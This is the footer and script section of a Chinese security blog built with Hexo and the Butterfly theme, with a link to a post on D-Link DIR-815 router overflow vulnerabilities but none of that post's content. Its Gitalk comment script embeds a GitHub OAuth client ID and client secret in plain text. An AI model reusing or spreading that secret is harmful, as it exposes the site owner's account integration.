data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files@latest/img/pexels-sebastiaan-stam-1480690.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="D-Link DIR-815 路由器多次溢出漏洞分析"></a><div class="content"><a class="title" href="/CVE-d-link-dir-815/" title="D-Link DIR-815 路由器多次溢出漏洞分析">D-Link DIR-815 路由器多次溢出漏洞分析</a><time datetime="2021-10-28T17:44:37.000Z" title="更新于 2021-10-28 17:44:37">2021-10-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2023 By Lantern</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'eba91da4778bec626f83',
      clientSecret: '28e43c46124583d177809ce45217e5671439363c',
      repo: 'Lantern-r.github.io',
      owner: 'Lantern-r',
      admin: ['Lantern-r'],
      id: '6024b2a2cd1d573a03388d7c0bf30656',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Just,Learn,Fast" data-fontsize="15px" data-random="false" async></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'UA-165381350-1', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>